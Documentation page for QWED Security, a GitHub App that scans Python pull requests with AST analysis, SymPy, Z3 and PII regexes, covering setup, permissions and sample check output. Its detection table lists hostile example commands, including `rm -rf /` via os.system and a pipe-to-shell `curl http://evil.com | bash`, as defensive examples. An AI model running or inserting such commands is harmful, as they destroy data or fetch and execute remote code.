---
sidebar_position: 20
title: QWED Security GitHub App
description: Automated deterministic verification for every Pull Request
---

# QWED Security — GitHub App

**Deterministic AI Verification for every Pull Request.**

[![GitHub Marketplace](https://img.shields.io/badge/Marketplace-QWED%20Security-blue?logo=github)](https://github.com/marketplace/qwed-security)

QWED Security is a **GitHub App** that automatically scans your Pull Requests using deterministic verification engines — not another LLM. It uses formal solvers (SymPy, Z3) and AST analysis to **mathematically prove** that code, math, and logic in your PRs are correct.

> **Unlike AI code reviewers that "guess," QWED Security provides deterministic proof. 1+1 always equals 2.**

---

## How It Works

```
Pull Request Opened / Updated
        ↓
GitHub Webhook → QWED Security App
        ↓
QWEDLocal Verification Engine
  ├─ 🛡️ Code Security (AST Analysis)
  ├─ 🧮 Math Verification (SymPy)
  ├─ ⚖️ Logic Validation (Z3 Prover)
  └─ 🔒 PII Detection (Regex Patterns)
        ↓
✅ Pass  or  ❌ Fail
        ↓
Results posted as a GitHub Check Run
```

1. A developer opens or updates a Pull Request
2. GitHub sends a webhook event to the QWED Security App
3. The app creates a **Check Run** ("QWED Security") on the PR
4. Files are scanned using `QWEDLocal` — QWED's in-process verification engine
5. Results are posted directly to the **Checks tab** on the PR

---

## What QWED Security Catches

### 🛡️ Code Security (AST Analysis)
Detects dangerous code patterns before they reach production:

| Pattern | Example | Risk |
|---------|---------|------|
| Shell injection | `os.system('rm -rf /')` | Remote Code Execution |
| Eval/Exec | `eval(user_input)` | Arbitrary code execution |
| Pipe-to-shell | `curl http://evil.com \| bash` | Supply chain attack |
| Hardcoded secrets | `api_key = "sk-proj-..."` | Credential exposure |
| Unsafe imports | `import subprocess` | Privilege escalation |

### 🧮 Math Verification (SymPy)
Validates mathematical formulas and constants:
- Tax rate calculations
- Interest/NPV formulas
- Unit conversions
- Financial compliance rules

### ⚖️ Logic Validation (Z3 Prover)
Ensures boolean logic and business rules are satisfiable:
- Contract clause contradictions
- Business rule conflicts
- Constraint satisfaction

### 🔒 PII Detection
Detects sensitive data before it enters your codebase:
- Credit card numbers
- Social Security Numbers (SSN)
- Email addresses
- API keys and tokens

---

## Installation

1. Visit the [QWED Security Marketplace page](https://github.com/marketplace/qwed-security)
2. Click **"Install"**
3. Select the repositories you want to protect
4. Done — QWED Security will automatically scan new Pull Requests

### Plans

| Plan | Scope | Price |
|------|-------|-------|
| **Free** | Open source & personal repositories | $0 |
| **Pro** | Private repositories, priority scanning | Coming soon |

---

## Check Run Output

When QWED Security scans a PR, you'll see results directly in the **Checks tab**:

### ✅ All Clear
```
QWED Verification Report

✅ Verified Files
✅ math_logic.py: Passed
✅ api_handler.py: Passed
```

### ❌ Issues Found
```
QWED Verification Report

🚨 Issues Detected
❌ dangerous.py: SECURITY_RISK
  > Reason: Forbidden function 'os.system' detected

✅ Verified Files
✅ math_logic.py: Passed
```

---

## Privacy & Security

- **No code storage**: QWED does not store your source code. Files are analyzed in-memory and discarded
- **Webhook verification**: All incoming webhooks are verified using HMAC-SHA256 signature validation
- **JWT authentication**: GitHub API calls use short-lived JWT tokens (10-minute expiry)
- **Open source engines**: All verification logic is open source under Apache 2.0

---

## Permissions

QWED Security requires the following GitHub App permissions:

| Permission | Access | Purpose |
|-----------|--------|---------|
| **Checks** | Read & Write | Create and update Check Runs on PRs |
| **Pull Requests** | Read | Read PR metadata and trigger scans |
| **Contents** | Read | Read repository files for verification |

---

## Configuration

QWED Security works **out-of-the-box** with zero configuration for Python projects. Simply install the app and it will start scanning PRs immediately.

### Currently Supported
- **Language**: Python (more languages coming soon)
- **Trigger**: Pull Request events (opened, synchronized, reopened)

---

## Relationship to QWED GitHub Action

| Feature | QWED Security (App) | QWED GitHub Action |
|---------|---------------------|-------------------|
| **Type** | Installed GitHub App | CI/CD Action |
| **Setup** | One-click install | Add to workflow YAML |
| **Trigger** | Automatic on PR | Configured in workflow |
| **Verification** | Code security focus | Math, Logic, Code, SQL |
| **LLM Required** | No (pure AST analysis) | Optional (for translation) |

The GitHub App provides **automatic, zero-config PR scanning**. The GitHub Action provides **configurable verification** within your CI/CD pipeline. They complement each other.

➡️ [QWED GitHub Action Documentation →](/docs/advanced/github-action)

---

## Support

- **Contact Form**: [qwedai.com/contact](https://qwedai.com/contact)
- **Email**: [support@qwedai.com](mailto:support@qwedai.com)
- **Issues**: [GitHub Issues](https://github.com/QWED-AI/qwed-verification/issues)
- **Documentation**: [docs.qwedai.com](https://docs.qwedai.com)

---

**Made with 💜 by [QWED-AI](https://github.com/QWED-AI)**
